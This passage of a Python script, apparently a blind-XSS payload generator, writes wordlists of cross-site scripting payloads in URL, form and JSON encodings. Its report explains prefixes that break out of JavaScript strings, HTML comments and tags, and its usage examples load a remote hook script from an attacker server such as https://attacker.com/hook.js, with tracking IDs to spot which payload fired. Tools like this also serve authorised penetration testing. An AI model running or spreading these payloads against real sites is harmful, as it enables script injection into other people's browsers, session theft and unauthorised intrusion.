        with open(f'{self.output_dir}/json_input_payloads.txt', 'w', encoding='utf-8') as f:
            f.write("# XSS PAYLOAD WORDLIST - JSON ESCAPED FORMAT\n")
            f.write("# " + "="*70 + "\n")
            f.write(f"# Use for: POST/PUT/PATCH with application/json\n")
            f.write(f"# Total Payloads: {total_with_escapes}\n")
            f.write(f"# Server: {self.attacker_server}{self.payload_file}\n")
            f.write(f"# Note: Double quotes and backslashes are escaped for JSON\n")
            f.write("# " + "="*70 + "\n\n")
            
            # Section 1: No Escape
            f.write("# " + "="*70 + "\n")
            f.write("# SECTION 1: NO ESCAPE PAYLOADS\n")
            f.write(f"# Total: {total_payloads} payloads\n")
            f.write("# " + "="*70 + "\n\n")
            
            payload_id = 1
            for payload in self.all_payloads:
                # Add tracking ID to URL in payload
                tracked = self._add_tracking_id(payload, payload_id)
                # JSON escape: \ → \\, " → \"
                json_escaped = tracked.replace('\\', '\\\\').replace('"', '\\"')
                f.write(f"{json_escaped}\n")
                payload_id += 1
            
            # Sections 2-4: With Prefix + Different Suffixes
            section_num = 2
            for suffix, suffix_desc in suffix_variants:
                f.write("\n# " + "="*70 + "\n")
                f.write(f"# SECTION {section_num}: PREFIX + {suffix_desc.upper()} SUFFIX\n")
                f.write(f"# Prefix: {escape_prefix}\n")
                f.write(f"# Suffix: {suffix}\n")
                f.write(f"# Total: {total_payloads} payloads\n")
                f.write("# " + "="*70 + "\n\n")
                
                for payload in self.all_payloads:
                    # Add tracking ID to URL in payload
                    tracked = self._add_tracking_id(payload, payload_id)
                    escaped_payload = f"{escape_prefix}{tracked}{suffix}"
                    # JSON escape
                    json_escaped = escaped_payload.replace('\\', '\\\\').replace('"', '\\"')
                    f.write(f"{json_escaped}\n")
                    payload_id += 1
                
                section_num += 1
        
        # 4. Analysis report
        with open(f'{self.output_dir}/payloads_analysis.txt', 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("XSS PAYLOAD ANALYSIS REPORT\n")
            f.write("="*70 + "\n\n")
            
            f.write(f"Attacker Server: {self.attacker_server}\n")
            f.write(f"Payload File: {self.payload_file}\n")
            f.write(f"Tracking Parameter: id\n\n")
            
            f.write("-"*70 + "\n")
            f.write("PAYLOAD STATISTICS\n")
            f.write("-"*70 + "\n")
            f.write(f"Base Payloads (No Escape): {total_payloads}\n")
            f.write(f"Escaped Payloads (3 variants): {total_payloads * 3}\n")
            f.write(f"Total Payloads: {total_with_escapes}\n\n")
            
            f.write("-"*70 + "\n")
            f.write("PREFIX + SUFFIX STRATEGY\n")
            f.write("-"*70 + "\n")
            f.write(f"Prefix (escape contexts): {escape_prefix}\n\n")
            f.write("Suffix variants (comment out remaining code):\n")
            for i, (suffix, desc) in enumerate(suffix_variants, 1):
                f.write(f"  {i}. {suffix:10s} - {desc}\n")
            f.write("\n")
            
            f.write("Prefix breaks out of:\n")
            f.write("  - JavaScript strings (single, double, template)\n")
            f.write("  - HTML comments (-->)\n")
            f.write("  - Script/Style/Textarea/Title/Template/Noscript/Noembed tags\n\n")
            
            f.write("Suffixes comment out:\n")
            f.write("  - Remaining HTML code\n")
            f.write("  - Remaining JS code\n")
            f.write("  - Combination of both\n\n")
            
            f.write("-"*70 + "\n")
            f.write("TRACKING INFORMATION\n")
            f.write("-"*70 + "\n")
            f.write(f"Monitor your server at: {self.attacker_server}{self.payload_file}\n")
            f.write(f"Successful hits will include: ?id=<N>\n")
            f.write(f"ID Range: 1 to {total_with_escapes}\n\n")
            
            f.write("-"*70 + "\n")
            f.write("FILE STRUCTURE\n")
            f.write("-"*70 + "\n")
            f.write("All wordlists contain the same payloads with different encoding:\n\n")
            f.write("1. www_input_payloads.txt (application/x-www-form-urlencoded)\n")
            f.write("   - Raw HTML/JS payloads\n")
            f.write("   - Browser will URL-encode on form submit\n\n")
            f.write("2. url_payloads.txt (GET requests)\n")
            f.write("   - Already URL-encoded\n")
            f.write("   - Use directly in URL parameters\n\n")
            f.write("3. json_input_payloads.txt (application/json)\n")
            f.write("   - JSON-escaped (\" and \\ escaped)\n")
            f.write("   - Safe for JSON string values\n\n")
            
            f.write("Each file contains 4 sections:\n")
            f.write(f"  Section 1: Payloads 1-{total_payloads} (No Escape)\n")
            section_start = total_payloads + 1
            for i, (suffix, desc) in enumerate(suffix_variants, 2):
                section_end = section_start + total_payloads - 1
                f.write(f"  Section {i}: Payloads {section_start}-{section_end} (Prefix + {desc})\n")
                section_start = section_end + 1
            f.write("\n")
            
            f.write("-"*70 + "\n")
            f.write("USAGE EXAMPLES\n")
            f.write("-"*70 + "\n")
            f.write("1. For GET URL parameter injection:\n")
            f.write("   Use: url_payloads.txt\n")
            f.write("   Example: ?search=<payload_from_file>\n\n")
            f.write("2. For POST form-urlencoded:\n")
            f.write("   Use: www_input_payloads.txt\n")
            f.write("   Example: title=Test&message=<payload_from_file>\n\n")
            f.write("3. For POST JSON:\n")
            f.write("   Use: json_input_payloads.txt\n")
            f.write("   Example: {\"name\": \"<payload_from_file>\"}\n\n")
            f.write("4. When successful hit occurs:\n")
            f.write("   Check server logs for: ?id=123\n")
            f.write("   Find line 123 in wordlist to identify payload\n")
            f.write("="*70 + "\n")
        
        print(f"\n[+] Wordlists exported to: {self.output_dir}/")
        print(f"    ├── www_input_payloads.txt   ({total_with_escapes} payloads - Form-urlencoded)")
        print(f"    ├── url_payloads.txt         ({total_with_escapes} payloads - GET/URL)")
        print(f"    ├── json_input_payloads.txt  ({total_with_escapes} payloads - JSON)")
        print(f"    └── payloads_analysis.txt    (Report)")

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Ultimate XSS Payload Generator V2',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage
  python3 blind_xss_generate.py --server https://attacker.com --file /hook.js
  
  # Custom output directory
  python3 blind_xss_generate.py --server https://xss.example.com --file /hook.js --output ./my_payloads
  
  # Using ngrok
  python3 blind_xss_generate.py --server https://abc123.ngrok.io --file /hook.js
        """
    )
    
    parser.add_argument('--server', default='https://attacker.com', 
                       help='Attacker server URL (default: https://attacker.com)')
    parser.add_argument('--file', default='/hook.js', 
                       help='Payload file path on server (default: /hook.js)')
    parser.add_argument('--output', default='./wordlists', 
                       help='Output directory (default: ./wordlists)')
    
    args = parser.parse_args()
    
    print("="*70)
    print("ULTIMATE XSS PAYLOAD GENERATOR V2")
    print("="*70)
    print(f"Attacker Server: {args.server}")
    print(f"Payload File: {args.file}")
    print(f"Output Directory: {args.output}")
    print("="*70 + "\n")
    
    # Generate payloads
    generator = UltimateXSSGenerator(
        attacker_server=args.server,
        payload_file=args.file,
        output_dir=args.output
    )
    
    payloads = generator.generate_all_payloads()
    generator.export_wordlists()
    
    base_count = len(payloads)
    total_with_escapes = base_count * 4  # base + 3 escaped variants
    
    print("\n" + "="*70)
    print("🎯 GENERATION COMPLETE!")
    print("="*70)
    print(f"📊 Base Payloads: {base_count}")
    print(f"📊 Escaped Variants: {base_count} × 3 = {base_count * 3}")
    print(f"📊 Total: {total_with_escapes}")
    print(f"📁 Output Directory: {args.output}")
    print(f"🔍 Monitor: {args.server}{args.file}?id=<N>")
    print("\n💡 STRUCTURE:")
    print(f"  • Section 1 (1-{base_count}): No escape")
    print(f"  • Section 2 ({base_count+1}-{base_count*2}): Prefix + <!-- suffix")
    print(f"  • Section 3 ({base_count*2+1}-{base_count*3}): Prefix + // suffix")
    print(f"  • Section 4 ({base_count*3+1}-{base_count*4}): Prefix + <!--// suffix")
    print("\n💡 USAGE:")
    print("  • Line N in file = Payload ID N")
    print("  • When server receives ?id=123, check line 123 in wordlist")
    print("  • www_input_payloads.txt   → POST form-urlencoded")
    print("  • url_payloads.txt         → GET URL parameters")
    print("  • json_input_payloads.txt  → POST JSON")
    print("="*70 + "\n")

if __name__ == "__main__":
    main()
